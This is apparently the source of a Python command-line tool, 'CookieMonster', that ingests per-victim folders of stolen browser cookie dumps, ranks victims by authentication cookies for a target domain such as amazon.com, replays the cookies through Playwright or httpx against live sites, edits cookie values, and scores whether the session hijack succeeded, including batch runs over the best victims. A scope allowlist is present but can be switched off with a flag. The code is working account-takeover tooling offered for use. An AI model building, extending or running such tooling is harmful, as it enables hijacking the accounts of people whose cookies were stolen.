"""Interface de linha de comando do CookieMonster."""

from __future__ import annotations

import click

from pathlib import Path

from . import __version__
from .ingest import ingest_dir
from .store.db import Store

from rich.console import Console
from rich.table import Table

console = Console()


def _load_store(db: str) -> Store:
    store = Store(db)
    store.init()
    return store


@click.group()
@click.version_option(__version__, prog_name="cookie-monster")
def cli():
    """CookieMonster - validador de session hijacking por cookie replay."""


@cli.command()
@click.option("--dir", "source_dir", type=click.Path(exists=True, file_okay=False,
                                                     path_type=Path), required=True,
              help="Diretorio raiz com as pastas de vítima (ex.: Cookies/)")
@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
              show_default=True, help="Caminho do store SQLite")
@click.option("--sample", type=int, default=0,
              help="Limita a ingestao às N primeiras vítimas (teste)")
@click.option("--resume", is_flag=True,
              help="Pula vítimas já ingeridas (retomada de ingest incompleta)")
def ingest(source_dir: Path, db_path: Path, sample: int, resume: bool):
    """Ingere dumps de cookies (Netscape/JSON) no store SQLite."""
    store = _load_store(str(db_path))
    console.print("[bold]Ingerindo dumps de cookies...[/]")
    stats = ingest_dir(store, source_dir, sample=sample, resume=resume)
    console.print()

    table = Table(title="Ingestão concluída")
    table.add_column("Item", style="cyan")
    table.add_column("Valor", justify="right")
    for key in ("victims", "files", "json_files", "cookies", "malformed_lines"):
        table.add_row(key.replace("_", " "), str(stats[key]))
    table.add_row("pulados", str(stats.get("skipped", 0)))
    table.add_row("erros", str(len(stats["errors"])))
    console.print(table)

    if stats["errors"]:
        console.print("[yellow]Vítimas sem cookies:[/]")
        for err in stats["errors"][:20]:
            console.print(f"  {err}")


@cli.command()
@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
              show_default=True)
def victims(db_path: Path):
    """Lista as vítimas ingeridas."""
    store = _load_store(str(db_path))
    rows = store.list_victims()
    table = Table(title="Vítimas")
    table.add_column("ID", justify="right", style="dim")
    table.add_column("Diretório")
    table.add_column("Layout")
    table.add_column("Cookies", justify="right")
    table.add_column("Domínios", justify="right")
    for row in rows:
        table.add_row(str(row["id"]), row["dir_name"], row["source_layout"],
                      str(row["cookie_count"]), str(row["domain_count"]))
    console.print(table)
    console.print(f"[dim]Total: {len(rows)} vítimas[/]")


@cli.command()
@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
              show_default=True)
@click.option("--victim", type=int, default=None, help="Filtra por ID de vítima")
@click.option("--domain", default=None, help="Filtra por domínio (ex.: amazon.com)")
def domains(db_path: Path, victim: int | None, domain: str | None):
    """Lista domínios e contagem de cookies."""
    store = _load_store(str(db_path))
    rows = store.list_domains(victim_id=victim, domain=domain)
    table = Table(title="Domínios")
    table.add_column("Victim ID", justify="right", style="dim")
    table.add_column("Domínio")
    table.add_column("Cookies", justify="right")
    for row in rows:
        table.add_row(str(row["victim_id"]), row["domain"], str(row["cookie_count"]))
    console.print(table)
    console.print(f"[dim]Total: {len(rows)} linhas[/]")


@cli.command()
@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
              show_default=True)
@click.option("--domain", required=True, help="Domínio alvo (ex.: amazon.com)")
@click.option("--limit", type=int, default=10, show_default=True)
def best(db_path: Path, domain: str, limit: int):
    """Seleciona as melhores vítimas para um domínio (heurística de artefato auth)."""
    store = _load_store(str(db_path))
    rows = store.best_victims_for_domain(domain, limit=limit)
    table = Table(title=f"Melhores vítimas para {domain}")
    table.add_column("Victim ID", justify="right", style="dim")
    table.add_column("Diretório")
    table.add_column("Auth", justify="right")
    table.add_column("Total", justify="right")
    for row in rows:
        table.add_row(str(row["victim_id"]), row["dir_name"],
                      str(row["auth"]), str(row["total"]))
    console.print(table)


@cli.command()
@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
              show_default=True)
@click.option("--victim", type=int, required=True, help="ID da vítima")
@click.option("--domain", required=True, help="Domínio alvo (ex.: amazon.com)")
@click.option("--scheme", type=click.Choice(["https", "http"]), default="https",
              show_default=True)
@click.option("--path", "req_path", default="/", show_default=True,
              help="Path do alvo para matching RFC 6265")
@click.option("--limit", type=int, default=100, show_default=True)
@click.option("--show-value", is_flag=True, help="Exibe o valor do cookie")
def cookies(db_path: Path, victim: int, domain: str, scheme: str, req_path: str,
            limit: int, show_value: bool):
    """Lista cookies aplicáveis a um alvo, usando matching RFC 6265."""
    from .domain.matcher import applicable_cookies

    store = _load_store(str(db_path))
    raw = store.list_cookies(victim_id=victim, domain=domain, limit=10000)
    host = domain.split("://")[-1].strip("/")
    matched = applicable_cookies(
        [dict(r) for r in raw], scheme=scheme, host=host, path=req_path
    )[:limit]

    table = Table(title=f"Cookies - vítima {victim} - {scheme}://{host}{req_path}")
    table.add_column("Nome")
    table.add_column("Domínio")
    table.add_column("Path")
    table.add_column("Secure", justify="center")
    table.add_column("HttpOnly", justify="center")
    table.add_column("HostOnly", justify="center")
    table.add_column("Expira", justify="right")
    if show_value:
        table.add_column("Valor")
    for row in matched:
        expiry = row["expires_epoch"]
        expiry_s = "sessão" if not expiry else str(expiry)
        if show_value:
            table.add_row(row["name"], row["domain"], row["path"],
                          "yes" if row["secure"] else "-",
                          "yes" if row["http_only"] else "-",
                          "yes" if row["host_only"] else "-",
                          expiry_s, row["value"])
        else:
            table.add_row(row["name"], row["domain"], row["path"],
                          "yes" if row["secure"] else "-",
                          "yes" if row["http_only"] else "-",
                          "yes" if row["host_only"] else "-",
                          expiry_s)
    console.print(table)
    console.print(f"[dim]Total: {len(matched)} cookies aplicáveis[/]")


# ---- Fase M2 (injeção & edição) ----

@cli.command()
@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
              show_default=True)
@click.option("--victim", type=int, required=True)
@click.option("--domain", required=True, help="Domínio alvo (ex.: amazon.com)")
@click.option("--url", required=True, help="URL a abrir (ex.: https://www.amazon.com)")
@click.option("--channel", type=click.Choice(["playwright", "httpx"]),
              default="playwright", show_default=True)
@click.option("--path", "req_path", default="/", show_default=True)
@click.option("--screenshot", "shot_dir", type=click.Path(path_type=Path), default=None,
              help="Diretorio para salvar screenshot (Playwright)")
@click.option("--allow-unsafe-scope", is_flag=True,
              help="Desativa o guardrail de escopo (fail-safe). NAO recomendado.")
@click.option("--replay-mode", type=click.Choice(["strict", "browser_default", "randomized"]),
              default="strict", show_default=True,
              help="Modo de replay (STRICT preserva fingerprint do dump).")
def inject(db_path: Path, victim: int, domain: str, url: str, channel: str,
           req_path: str, shot_dir: Path, allow_unsafe_scope: bool, replay_mode: str):
    """Injeta os cookies da vítima num contexto de requisição e reporta o envio."""
    from .domain.matcher import applicable_cookies
    from .inject.capture import summarize_sent
    from .inject import httpx_client, playwright_client
    from .util import scope as scope_util

    store = _load_store(str(db_path))
    raw = store.list_cookies(victim_id=victim, domain=domain, limit=100000)
    scheme = "http" if url.startswith("http://") else "https"
    host = domain.split("://")[-1].strip("/")

    if not scope_util.allowed(host, unsafe=allow_unsafe_scope):
        console.print("[red]Recusado: alvo fora da allowlist (scope.txt). Use "
                      "--allow-unsafe-scope para desabilitar (NAO recomendado).[/]")
        return

    cookies = applicable_cookies([dict(r) for r in raw], scheme, host, req_path)

    if not cookies:
        console.print(f"[yellow]Nenhum cookie aplicável para {scheme}://{host}{req_path}[/]")
        return

    console.print(f"[bold]{len(cookies)} cookies aplicáveis; canal={channel}[/]")

    if channel == "httpx":
        result = httpx_client.get(url, cookies)
        result["sent_cookies"] = []
    else:
        shot_path = None
        if shot_dir:
            shot_dir.mkdir(parents=True, exist_ok=True)
            shot_path = shot_dir / f"victim_{victim}_{host}.png"
        result = playwright_client.replay(url, cookies, screenshot_path=shot_path, mode=replay_mode)

    if result.get("error"):
        console.print(f"[red]Erro no replay: {result['error']}[/]")
        return

    console.print(f"status={result.get('status_code')} final={result.get('final_url')}")

    if channel == "playwright":
        injected_names = [c["name"] for c in cookies]
        summary = summarize_sent(result, injected_names)
        console.print(f"[green]Enviados ao alvo ({len(summary['sent'])}):[/] "
                      + ", ".join(summary["sent"]) if summary["sent"] else "")
        if summary["not_sent"]:
            console.print(f"[dim]Não enviados ({len(summary['not_sent'])}):[/] "
                          + ", ".join(summary["not_sent"]))
        if result.get("screenshot"):
            console.print(f"[dim]Screenshot: {result['screenshot']}[/]")


@cli.command()
@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
              show_default=True)
@click.option("--victim", type=int, required=True)
@click.option("--domain", required=True)
@click.option("--cookie", required=True, help="Nome do cookie a alterar")
@click.option("--value", required=True, help="Novo valor")
def edit(db_path: Path, victim: int, domain: str, cookie: str, value: str):
    """Altera o valor de um cookie capturado (replay de artefato editado)."""
    store = _load_store(str(db_path))
    n = store.update_cookie_value(victim, domain, cookie, value)
    console.print(f"[green]Atualizadas {n} linha(s) de '{cookie}[/]' "
                  f"para vítima {victim}@{domain}")


@cli.command()
@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
              show_default=True)
@click.option("--victim", type=int, required=True)
@click.option("--domain", required=True, help="Domínio alvo (ex.: amazon.com)")
@click.option("--url", default=None, help="URL alvo (padrão: https://<host>/")
@click.option("--channel", type=click.Choice(["playwright", "httpx"]),
              default="playwright", show_default=True)
@click.option("--path", "req_path", default="/", show_default=True)
@click.option("--screenshot", "shot_dir", type=click.Path(path_type=Path), default=None,
              help="Salva screenshots de baseline/injetado")
@click.option("--allow-unsafe-scope", is_flag=True,
              help="Desativa o guardrail de escopo (fail-safe). NAO recomendado.")
@click.option("--replay-mode", type=click.Choice(["strict", "browser_default", "randomized"]),
              default="strict", show_default=True,
              help="Modo de replay (STRICT preserva fingerprint do dump).")
def check(db_path: Path, victim: int, domain: str, url: str, channel: str,
          req_path: str, shot_dir: Path, allow_unsafe_scope: bool, replay_mode: str):
    """[M3] Valida se o session hijack teve sucesso no domínio alvo."""
    from .domain.matcher import applicable_cookies
    from .validate.auth_state import detect
    from .validate.scoring import score_artifacts
    from .inject import httpx_client, playwright_client
    from .inject.capture import sent_cookie_names
    from .util import scope as scope_util

    store = _load_store(str(db_path))
    host = domain.split("://")[-1].strip("/")
    target_url = url or f"https://{host}{req_path}"
    scheme = "http" if target_url.startswith("http://") else "https"

    if not scope_util.allowed(host, unsafe=allow_unsafe_scope):
        console.print("[red]Recusado: alvo fora da allowlist (scope.txt). Use "
                      "--allow-unsafe-scope para desabilitar (NAO recomendado).[/]")
        return

    raw = store.list_cookies(victim_id=victim, domain=domain, limit=100000)
    cookies = applicable_cookies([dict(r) for r in raw], scheme, host, req_path)

    console.print(f"[bold]check[/] vítima={victim} {scheme}://{host}{req_path} "
                  f"[{len(cookies)} cookies aplicáveis, canal={channel}]")

    def replay(shot_suffix, with_cookies):
        shot_path = None
        if shot_dir:
            shot_dir.mkdir(parents=True, exist_ok=True)
            shot_path = shot_dir / f"victim_{victim}_{host}_{shot_suffix}.png"
        if channel == "httpx":
            res = httpx_client.get(target_url, with_cookies)
            res.setdefault("sent_cookies", [])
            # httpx nao captura quais cookies foram enviados; aproxima pelos injetados.
            res["sent_cookies"] = [{"headers": {"cookie": httpx_client.cookies_to_header(with_cookies)}}]
            res.setdefault("error", None)
            return res
        return playwright_client.replay(
            target_url, with_cookies, screenshot_path=shot_path, mode=replay_mode
        )

    # Baseline (sem cookies).
    baseline = replay("baseline", [])
    if not _verify_effective_urls(baseline, scope_util, allow_unsafe_scope):
        return
    # Injetado (com cookies).
    injected = replay("injected", cookies)
    if not _verify_effective_urls(injected, scope_util, allow_unsafe_scope):
        return

    result = detect(baseline, injected, host)
    sent_names = sent_cookie_names(injected)
    artifacts = score_artifacts(sent_names, cookies)

    # Persistência.
    from .report import json_out
    evidence_blob = json_out.dumps({
        "state": result["state"], "confidence": result["confidence"],
        "profile": result["profile"], "evidence": result["evidence"],
        "baseline": {k: baseline.get(k) for k in
                     ("status", "final_url", "title")},
        "injected": {k: injected.get(k) for k in
                      ("status", "final_url", "title")},
    })
    run_id = store.record_run(victim, target_url, host, channel,
                              state=result["state"],
                              confidence=result["confidence"],
                              evidence_json=evidence_blob)
    findings_rows = [
        (run_id, a["name"], 1 if a["sent"] else 0, a["kind"],
         float(a["score"]) / 10.0, "")
        for a in artifacts
    ]
    store.add_findings(run_id, findings_rows)

    _print_check_result(result, sent_names, artifacts, injected)



def _verify_effective_urls(result: dict, scope_util, unsafe: bool) -> bool:
    """Retorna True se todos os hosts efetivamente acessados estao na allowlist."""
    urls = [result.get("final_url")] if result.get("final_url") else []
    urls += [r.get("url") for r in result.get("redirect_chain", []) if r.get("url")]
    for u in urls:
        if not u:
            continue
        host = u.split("://")[-1].split("/")[0].split(":")[0]
        if not scope_util.allowed(host, unsafe=unsafe):
            console.print(f"[red]Recusado: redirect para fora da allowlist: {host}[/]")
            return False
    return True


def _tri_label(value):
    return {1: "yes", 0: "no", -1: "?"}.get(value,)


def _print_check_result(result, sent_names, artifacts, injected):
    state = result["state"]
    color = {"CONFIRMED": "green", "LIKELY": "cyan", "ANONYMOUS": "red",
             "UNKNOWN": "yellow"}.get(state, "yellow")
    console.print(f"\n[bold {color}]{state}[/] (confianca {result['confidence']:.2f}, perfil {result['profile']})")

    ev = result["evidence"]
    console.print(f"  baseline status={ev.get('status_baseline')} | injetado status={ev.get('status_injected')}")
    if ev.get("injected_markers"):
        console.print(f"  markers injetado: {', '.join(ev['injected_markers'])}")
    identity = ev.get("identity_injected") or {}
    if identity:
        ids = ", ".join(f"{k}={v}" for k, v in identity.items())
        console.print(f"  [bold]identidade[/]: {ids}")
    chain = ev.get("redirect_chain") or []
    if chain:
        chain_s = " -> ".join(f"{c['status']} {c['url']}" for c in chain[:5])
        console.print(f"  redirects: {chain_s}")
    if injected.get("error"):
        console.print(f"  [red]erro replay: {injected['error']}[/]")

    if artifacts:
        table = Table(title="Artefatos (score)")
        table.add_column("Cookie", style="cyan")
        table.add_column("Tipo")
        table.add_column("Enviado", justify="center")
        table.add_column("HttpOnly", justify="center")
        table.add_column("Secure", justify="center")
        table.add_column("SameSite")
        table.add_column("Score", justify="right")
        for a in artifacts:
            table.add_row(a["name"], a["kind"],
                          "yes" if a["sent"] else "-",
                          _tri_label(a.get("http_only_state")),
                          _tri_label(a.get("secure_state")),
                          str(a.get("same_site") or "-"),
                          str(a["score"]))
        console.print(table)
    console.print(f"[dim]Cookies enviados: {len(sent_names)}[/]")


@cli.command()
@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
              show_default=True)
@click.option("--out", "out_dir", type=click.Path(path_type=Path), default="reports",
              show_default=True)
def report(db_path: Path, out_dir: Path):
    """Consolida runs+findings em console, JSON e Markdown."""
    from .report import builder, console as report_console
    from .report import json_out, markdown_out

    store = _load_store(str(db_path))
    out_dir = Path(out_dir)
    out_dir.mkdir(parents=True, exist_ok=True)

    data = builder.build_report(store)
    report_console.render_summary(data)
    json_out.dump(data, out_dir / "report.json")
    markdown_out.dump(data, out_dir / "report.md")
    console.print(f"[green]Relatórios gerados em {out_dir}/[/]")


@cli.command()
@click.option("--db", "db_path", type=click.Path(path_type=Path), default="store.db",
              show_default=True)
@click.option("--domain", required=True, help="Domínio alvo (ex.: amazon.com)")
@click.option("--limit", type=int, default=5, show_default=True,
              help="Número de vítimas (melhores) a testar")
@click.option("--channel", type=click.Choice(["playwright", "httpx"]),
              default="httpx", show_default=True)
@click.option("--allow-unsafe-scope", is_flag=True,
              help="Desativa o guardrail de escopo (fail-safe).")
def check_batch(db_path: Path, domain: str, limit: int, channel: str,
                allow_unsafe_scope: bool):
    """Testa as N melhores vítimas de um domínio em lote (check em sequência)."""
    store = _load_store(str(db_path))
    best = store.best_victims_for_domain(domain, limit=limit)
    if not best:
        console.print(f"[yellow]Nenhuma vítima com cookies para {domain}[/]")
        return

    victim_ids = [r["victim_id"] for r in best]
    results = []
    for vid in victim_ids:
        console.print(f"\n[bright_black]--- vítima {vid} ---[/]")
        # click.Context com forward garante que todos os kwargs cheguem.
        with click.Context(check) as cctx:
            cctx.invoke(check, db_path=db_path, victim=vid, domain=domain,
                        url=None, channel=channel, req_path="/", shot_dir=None,
                        allow_unsafe_scope=allow_unsafe_scope, replay_mode="strict")
        # Recupera o ultimo run desta vítima/domain para sumarizar.
        run = store.list_runs()
        row = next((r for r in run if r["victim_id"] == vid
                    and r["target_domain"] == domain), None)
        if row:
            results.append(row)
    console.print(f"\n[bold]Batch concluído: {len(results)} runs.[/]")


def main() -> int:
    return cli()


if __name__ == "__main__":
    main()